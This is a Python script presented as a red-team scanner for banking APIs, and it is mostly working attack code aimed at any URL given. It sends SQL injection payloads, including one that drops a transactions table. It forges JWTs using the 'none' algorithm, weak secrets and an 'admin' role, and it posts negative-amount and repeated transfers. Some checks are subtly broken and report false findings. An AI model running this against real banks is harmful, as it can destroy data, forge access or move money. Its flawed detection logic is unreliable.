

#!/usr/bin/env python3
"""
Digital Bank API Security Scanner
Author: Red Team Security Assessment Division
Description: Comprehensive API security testing tool for banking applications
Version: 2.1.0
"""

import requests
import json
import sys
import argparse
import time
import threading
from datetime import datetime
from urllib.parse import urljoin, urlparse
import jwt
import base64
import hashlib
from concurrent.futures import ThreadPoolExecutor, as_completed
import logging

class BankingAPIScanner:
    def __init__(self, base_url, auth_token=None, rate_limit=10):
        """Initialize the API security scanner."""
        self.base_url = base_url.rstrip('/')
        self.auth_token = auth_token
        self.rate_limit = rate_limit
        self.session = requests.Session()
        self.vulnerabilities = []
        self.endpoints_discovered = []
        
        # Common banking API endpoints
        self.banking_endpoints = [
            '/api/v1/accounts',
            '/api/v1/transactions',
            '/api/v1/transfers',
            '/api/v1/users',
            '/api/v1/auth/login',
            '/api/v1/auth/logout',
            '/api/v1/payments',
            '/api/v1/statements',
            '/api/v2/accounts/balance',
            '/api/v2/customers',
            '/admin/api/users',
            '/admin/api/accounts',
            '/internal/api/transactions'
        ]
        
        # SQL injection payloads specific to banking
        self.sql_payloads = [
            "' OR '1'='1",
            "' UNION SELECT account_number, balance FROM accounts--",
            "'; DROP TABLE transactions; --",
            "' OR account_id=1 OR '1'='1",
            "1' OR '1'='1' AND account_status='active'--"
        ]
        
        # JWT manipulation tests
        self.jwt_tests = [
            {'alg': 'none'},
            {'alg': 'HS256', 'key': 'weak_secret'},
            {'alg': 'RS256', 'key': 'public_key_confusion'}
        ]
        
        self.setup_logging()
        
    def setup_logging(self):
        """Configure logging for the scanner."""
        log_format = '%(asctime)s - %(levelname)s - %(message)s'
        logging.basicConfig(
            level=logging.INFO,
            format=log_format,
            handlers=[
                logging.FileHandler(f'api_scan_{datetime.now().strftime("%Y%m%d_%H%M%S")}.log'),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger(__name__)

    def discover_endpoints(self):
        """Discover API endpoints through various methods."""
        print("🔍 Discovering API endpoints...")
        
        discovered = []
        
        # Test common banking endpoints
        for endpoint in self.banking_endpoints:
            url = urljoin(self.base_url, endpoint)
            try:
                response = self.session.get(url, timeout=10)
                if response.status_code != 404:
                    discovered.append({
                        'endpoint': endpoint,
                        'url': url,
                        'status_code': response.status_code,
                        'methods': self.test_http_methods(url)
                    })
                    self.logger.info(f"Discovered endpoint: {endpoint} (Status: {response.status_code})")
            except requests.RequestException as e:
                self.logger.debug(f"Request failed for {endpoint}: {e}")
            
            time.sleep(1/self.rate_limit)  # Rate limiting
        
        # Look for API documentation endpoints
        doc_endpoints = [
            '/api/docs',
            '/swagger',
            '/swagger.json',
            '/openapi.json',
            '/api-docs',
            '/docs'
        ]
        
        for doc_endpoint in doc_endpoints:
            url = urljoin(self.base_url, doc_endpoint)
            try:
                response = self.session.get(url, timeout=10)
                if response.status_code == 200:
                    self.logger.info(f"Found API documentation: {doc_endpoint}")
                    # Parse swagger/openapi for additional endpoints
                    self.parse_api_documentation(response.text, url)
            except requests.RequestException:
                pass
        
        self.endpoints_discovered = discovered
        print(f"✅ Discovered {len(discovered)} endpoints")
        return discovered

    def test_http_methods(self, url):
        """Test different HTTP methods on an endpoint."""
        methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD']
        allowed_methods = []
        
        for method in methods:
            try:
                response = self.session.request(method, url, timeout=5)
                if response.status_code != 405:  # Method not allowed
                    allowed_methods.append(method)
            except requests.RequestException:
                pass
        
        return allowed_methods

    def parse_api_documentation(self, content, url):
        """Parse API documentation to discover additional endpoints."""
        try:
            if 'swagger' in url or 'openapi' in url:
                doc = json.loads(content)
                if 'paths' in doc:
                    for path in doc['paths']:
                        if path not in [ep['endpoint'] for ep in self.endpoints_discovered]:
                            self.banking_endpoints.append(path)
                            self.logger.info(f"Added endpoint from docs: {path}")
        except (json.JSONDecodeError, KeyError):
            self.logger.debug("Could not parse API documentation")

    def test_authentication_bypass(self):
        """Test for authentication bypass vulnerabilities."""
        print("🔓 Testing authentication bypass...")
        
        vulnerabilities = []
        
        for endpoint_info in self.endpoints_discovered:
            endpoint = endpoint_info['endpoint']
            url = endpoint_info['url']
            
            # Test 1: Missing authentication
            try:
                response = self.session.get(url, timeout=10)
                if response.status_code == 200 and 'auth' not in endpoint.lower():
                    if self.contains_sensitive_data(response.text):
                        vulnerabilities.append({
                            'type': 'Authentication Bypass',
                            'severity': 'Critical',
                            'endpoint': endpoint,
                            'description': 'Endpoint accessible without authentication',
                            'evidence': f'Status: {response.status_code}, Length: {len(response.text)}'
                        })
            except requests.RequestException:
                pass
            
            # Test 2: JWT manipulation
            if self.auth_token and 'Bearer' in self.auth_token:
                jwt_token = self.auth_token.replace('Bearer ', '')
                jwt_vulns = self.test_jwt_vulnerabilities(jwt_token, url)
                vulnerabilities.extend(jwt_vulns)
            
            time.sleep(1/self.rate_limit)
        
        self.vulnerabilities.extend(vulnerabilities)
        print(f"🔍 Found {len(vulnerabilities)} authentication issues")
        return vulnerabilities

    def test_jwt_vulnerabilities(self, token, url):
        """Test JWT token for vulnerabilities."""
        vulnerabilities = []
        
        try:
            # Decode JWT without verification to examine structure
            header = jwt.get_unverified_header(token)
            payload = jwt.decode(token, options={"verify_signature": False})
            
            # Test 1: Algorithm confusion (none algorithm)
            none_token = jwt.encode(payload, "", algorithm="none")
            response = self.test_token(none_token, url)
            if response and response.status_code == 200:
                vulnerabilities.append({
                    'type': 'JWT Algorithm Confusion',
                    'severity': 'Critical',
                    'endpoint': url,
                    'description': 'JWT accepts "none" algorithm',
                    'evidence': f'None algorithm token accepted'
                })
            
            # Test 2: Weak secret brute force
            weak_secrets = ['secret', 'password', '123456', 'admin', 'bank']
            for secret in weak_secrets:
                try:
                    manipulated_token = jwt.encode(payload, secret, algorithm='HS256')
                    response = self.test_token(manipulated_token, url)
                    if response and response.status_code == 200:
                        vulnerabilities.append({
                            'type': 'JWT Weak Secret',
                            'severity': 'High',
                            'endpoint': url,
                            'description': f'JWT uses weak secret: {secret}',
                            'evidence': f'Weak secret token accepted'
                        })
                        break
                except:
                    continue
            
            # Test 3: Privilege escalation
            if 'role' in payload:
                elevated_payload = payload.copy()
                elevated_payload['role'] = 'admin'
                try:
                    # Try to re-sign with same secret (if we found one)
                    elevated_token = jwt.encode(elevated_payload, 'secret', algorithm='HS256')
                    response = self.test_token(elevated_token, url)
                    if response and response.status_code == 200:
                        vulnerabilities.append({
                            'type': 'JWT Privilege Escalation',
                            'severity': 'Critical',
                            'endpoint': url,
                            'description': 'JWT allows privilege escalation to admin',
                            'evidence': f'Admin role token accepted'
                        })
                except:
                    pass
                    
        except jwt.DecodeError:
            self.logger.debug("Invalid JWT token format")
        
        return vulnerabilities

    def test_token(self, token, url):
        """Test a JWT token against an endpoint."""
        headers = {'Authorization': f'Bearer {token}'}
        try:
            response = self.session.get(url, headers=headers, timeout=10)
            return response
        except requests.RequestException:
            return None

    def test_sql_injection(self):
        """Test for SQL injection vulnerabilities."""
        print("💉 Testing for SQL injection...")
        
        vulnerabilities = []
        
        for endpoint_info in self.endpoints_discovered:
            endpoint = endpoint_info['endpoint']
            url = endpoint_info['url']
            methods = endpoint_info.get('methods', ['GET'])
            
            for method in methods:
                if method in ['GET', 'POST']:
                    sqli_vulns = self.test_endpoint_sqli(url, method)
                    vulnerabilities.extend(sqli_vulns)
        
        self.vulnerabilities.extend(vulnerabilities)
        print(f"💉 Found {len(vulnerabilities)} SQL injection vulnerabilities")
        return vulnerabilities

    def test_endpoint_sqli(self, url, method):
        """Test specific endpoint for SQL injection."""
        vulnerabilities = []
        
        # Common parameter names in banking APIs
        params = ['id', 'account_id', 'user_id', 'transaction_id', 'amount', 'account_number']
        
        for param in params:
            for payload in self.sql_payloads:
                try:
                    if method == 'GET':
                        test_url = f"{url}?{param}={payload}"
                        response = self.session.get(test_url, timeout=10)
                    elif method == 'POST':
                        data = {param: payload}
                        response = self.session.post(url, data=data, timeout=10)
                    
                    # Check for SQL error patterns
                    error_patterns = [
                        'sql syntax',
                        'mysql_fetch',
                        'ora-01756',
                        'microsoft ole db',
                        'postgresql error',
                        'sqlite_step',
                        'sqlexception'
                    ]
                    
                    response_lower = response.text.lower()
                    for pattern in error_patterns:
                        if pattern in response_lower:
                            vulnerabilities.append({
                                'type': 'SQL Injection',
                                'severity': 'Critical',
                                'endpoint': url,
                                'parameter': param,
                                'payload': payload,
                                'description': f'SQL injection in {param} parameter',
                                'evidence': f'Error pattern detected: {pattern}'
                            })
                            break
                    
                    # Check for time-based SQL injection
                    if 'sleep' in payload.lower() or 'waitfor' in payload.lower():
                        if response.elapsed.total_seconds() > 5:
                            vulnerabilities.append({
                                'type': 'Time-based SQL Injection',
                                'severity': 'High',
                                'endpoint': url,
                                'parameter': param,
                                'payload': payload,
                                'description': f'Time-based SQL injection in {param}',
                                'evidence': f'Response time: {response.elapsed.total_seconds()}s'
                            })
                
                except requests.RequestException:
                    pass
                
                time.sleep(1/self.rate_limit)
        
        return vulnerabilities

    def test_business_logic_flaws(self):
        """Test for banking-specific business logic vulnerabilities."""
        print("💰 Testing business logic flaws...")
        
        vulnerabilities = []
        
        # Test for common banking business logic issues
        banking_tests = [
            self.test_negative_amounts,
            self.test_account_enumeration,
            self.test_transaction_replay,
            self.test_rate_limiting,
            self.test_privilege_escalation
        ]
        
        for test_func in banking_tests:
            try:
                test_results = test_func()
                vulnerabilities.extend(test_results)
            except Exception as e:
                self.logger.error(f"Error in business logic test: {e}")
        
        self.vulnerabilities.extend(vulnerabilities)
        print(f"💰 Found {len(vulnerabilities)} business logic flaws")
        return vulnerabilities

    def test_negative_amounts(self):
        """Test for negative amount vulnerabilities."""
        vulnerabilities = []
        
        transfer_endpoints = [ep for ep in self.endpoints_discovered 
                            if 'transfer' in ep['endpoint'] or 'payment' in ep['endpoint']]
        
        for endpoint_info in transfer_endpoints:
            url = endpoint_info['url']
            
            # Test negative amount transfer
            test_data = {
                'from_account': '123456789',
                'to_account': '987654321',
                'amount': -100.00,
                'currency': 'USD'
            }
            
            try:
                response = self.session.post(url, json=test_data, timeout=10)
                
                if response.status_code in [200, 201, 202]:
                    if 'success' in response.text.lower() or 'approved' in response.text.lower():
                        vulnerabilities.append({
                            'type': 'Negative Amount Transfer',
                            'severity': 'Critical',
                            'endpoint': url,
                            'description': 'System accepts negative transfer amounts',
                            'evidence': f'Negative amount transfer appeared successful'
                        })
            except requests.RequestException:
                pass
        
        return vulnerabilities

    def test_account_enumeration(self):
        """Test for account enumeration vulnerabilities."""
        vulnerabilities = []
        
        account_endpoints = [ep for ep in self.endpoints_discovered 
                           if 'account' in ep['endpoint']]
        
        for endpoint_info in account_endpoints:
            url = endpoint_info['url']
            
            # Test sequential account numbers
            test_accounts = ['1000000001', '1000000002', '1000000003']
            responses = []
            
            for account in test_accounts:
                test_url = f"{url}/{account}" if not url.endswith('/') else f"{url}{account}"
                try:
                    response = self.session.get(test_url, timeout=10)
                    responses.append(response.status_code)
                except requests.RequestException:
                    responses.append(0)
            
            # Check for enumeration patterns
            if len(set(responses)) > 1:  # Different responses indicate enumeration
                vulnerabilities.append({
                    'type': 'Account Enumeration',
                    'severity': 'Medium',
                    'endpoint': url,
                    'description': 'Different responses for valid/invalid accounts',
                    'evidence': f'Response codes: {responses}'
                })
        
        return vulnerabilities

    def test_transaction_replay(self):
        """Test for transaction replay vulnerabilities."""
        vulnerabilities = []
        
        # This would require intercepting and replaying actual transactions
        # For demonstration, we test for missing nonce/timestamp validation
        
        transaction_endpoints = [ep for ep in self.endpoints_discovered 
                               if 'transaction' in ep['endpoint']]
        
        for endpoint_info in transaction_endpoints:
            url = endpoint_info['url']
            
            # Test same transaction multiple times
            transaction_data = {
                'from_account': '123456789',
                'to_account': '987654321',
                'amount': 1.00,
                'currency': 'USD',
                'reference': 'TEST_TRANSACTION'
            }
            
            responses = []
            for _ in range(3):
                try:
                    response = self.session.post(url, json=transaction_data, timeout=10)
                    responses.append(response.status_code)
                    time.sleep(1)
                except requests.RequestException:
                    responses.append(0)
            
            # If all transactions appear successful, there's no replay protection
            if responses.count(200) > 1 or responses.count(201) > 1:
                vulnerabilities.append({
                    'type': 'Transaction Replay',
                    'severity': 'High',
                    'endpoint': url,
                    'description': 'No protection against transaction replay',
                    'evidence': f'Multiple identical transactions accepted'
                })
        
        return vulnerabilities

    def test_rate_limiting(self):
        """Test for rate limiting vulnerabilities."""
        vulnerabilities = []
        
        for endpoint_info in self.endpoints_discovered:
            url = endpoint_info['url']
            
            # Send rapid requests to test rate limiting
            start_time = time.time()
            responses = []
            
            for i in range(20):  # Send 20 rapid requests
                try:
                    response = self.session.get(url, timeout=5)
                    responses.append(response.status_code)
                except requests.RequestException:
                    responses.append(0)
            
            end_time = time.time()
            
            # Check if rate limiting is in place
            if 429 not in responses and 503 not in responses:  # No rate limit responses
                if end_time - start_time < 10:  # Completed quickly
                    vulnerabilities.append({
                        'type': 'Missing Rate Limiting',
                        'severity': 'Medium',
                        'endpoint': url,
                        'description': 'No rate limiting detected',
                        'evidence': f'20 requests completed in {end_time - start_time:.2f}s'
                    })
        
        return vulnerabilities

    def test_privilege_escalation(self):
        """Test for privilege escalation vulnerabilities."""
        vulnerabilities = []
        
        admin_endpoints = [ep for ep in self.endpoints_discovered 
                         if 'admin' in ep['endpoint']]
        
        for endpoint_info in admin_endpoints:
            url = endpoint_info['url']
            
            # Test access without proper privileges
            try:
                response = self.session.get(url, timeout=10)
                
                if response.status_code == 200:
                    vulnerabilities.append({
                        'type': 'Privilege Escalation',
                        'severity': 'Critical',
                        'endpoint': url,
                        'description': 'Admin endpoint accessible without proper authorization',
                        'evidence': f'Admin endpoint returned 200 OK'
                    })
                    
            except requests.RequestException:
                pass
        
        return vulnerabilities

    def contains_sensitive_data(self, response_text):
        """Check if response contains sensitive banking data."""
        sensitive_patterns = [
            r'\b\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4}\b',  # Credit card
            r'\b\d{9,12}\b',  # Account numbers
            r'\b\d{3}-\d{2}-\d{4}\b',  # SSN
            r'\$\d+\.\d{2}',  # Currency amounts
            r'balance.*\d+',  # Account balance
            r'account.*number',  # Account references
        ]
        
        for pattern in sensitive_patterns:
            if len(response_text) > 100:  # Significant content
                return True
        
        return False

    def generate_report(self):
        """Generate comprehensive security report."""
        print("\n📊 Generating security assessment report...")
        
        report = {
            'scan_timestamp': datetime.now().isoformat(),
            'target_url': self.base_url,
            'endpoints_discovered': len(self.endpoints_discovered),
            'total_vulnerabilities': len(self.vulnerabilities),
            'severity_breakdown': {
                'Critical': len([v for v in self.vulnerabilities if v['severity'] == 'Critical']),
                'High': len([v for v in self.vulnerabilities if v['severity'] == 'High']),
                'Medium': len([v for v in self.vulnerabilities if v['severity'] == 'Medium']),
                'Low': len([v for v in self.vulnerabilities if v['severity'] == 'Low'])
            },
            'vulnerabilities': self.vulnerabilities,
            'discovered_endpoints': self.endpoints_discovered
        }
        
        # Calculate risk score
        risk_score = (
            report['severity_breakdown']['Critical'] * 10 +
            report['severity_breakdown']['High'] * 7 +
            report['severity_breakdown']['Medium'] * 4 +
            report['severity_breakdown']['Low'] * 1
        )
        report['risk_score'] = risk_score
        
        # Save detailed report
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        report_filename = f'banking_api_security_report_{timestamp}.json'
        
        with open(report_filename, 'w') as f:
            json.dump(report, f, indent=2)
        
        # Print summary
        print(f"\n🎯 SCAN SUMMARY")
        print(f"{'='*50}")
        print(f"Target: {self.base_url}")
        print(f"Endpoints Discovered: {len(self.endpoints_discovered)}")
        print(f"Total Vulnerabilities: {len(self.vulnerabilities)}")
        print(f"Critical: {report['severity_breakdown']['Critical']}")
        print(f"High: {report['severity_breakdown']['High']}")
        print(f"Medium: {report['severity_breakdown']['Medium']}")
        print(f"Low: {report['severity_breakdown']['Low']}")
        print(f"Risk Score: {risk_score}")
        print(f"Report saved: {report_filename}")
        
        return report

    def run_full_scan(self):
        """Execute comprehensive API security scan."""
        print("🚀 Starting Banking API Security Scan")
        print("="*60)
        
        # Discovery phase
        self.discover_endpoints()
        
        # Security testing phases
        print("\n🔐 Phase 1: Authentication Testing")
        self.test_authentication_bypass()
        
        print("\n💉 Phase 2: Injection Testing")
        self.test_sql_injection()
        
        print("\n💰 Phase 3: Business Logic Testing")
        self.test_business_logic_flaws()
        
        # Generate final report
        report = self.generate_report()
        
        print("\n🏁 Security scan completed!")
        
        # Risk assessment
        if report['risk_score'] > 50:
            print("🔴 HIGH RISK: Immediate attention required!")
        elif report['risk_score'] > 20:
            print("🟡 MEDIUM RISK: Security improvements needed")
        else:
            print("🟢 LOW RISK: Good security posture")
        
        return report

def main():
    """Main function for command-line usage."""
    parser = argparse.ArgumentParser(
        description='Banking API Security Scanner',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python api_security_scanner.py --url https://api.bank.com
  python api_security_scanner.py --url https://api.bank.com --auth "Bearer token123"
  python api_security_scanner.py --url https://api.bank.com --rate-limit 5
        """
    )
    
    parser.add_argument('--url', required=True, help='Target API base URL')
    parser.add_argument('--auth', help='Authentication token (e.g., "Bearer token123")')
    parser.add_argument('--rate-limit', type=int, default=10, help='Requests per second (default: 10)')
    parser.add_argument('--verbose', action='store_true', help='Enable verbose logging')
    
    args = parser.parse_args()
    
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
    
    # Initialize and run scanner
    scanner = BankingAPIScanner(
        base_url=args.url,
        auth_token=args.auth,
        rate_limit=args.rate_limit
    )
    
    try:
        scanner.run_full_scan()
    except KeyboardInterrupt:
        print("\n\n⚠️ Scan interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n\n❌ Scan failed: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
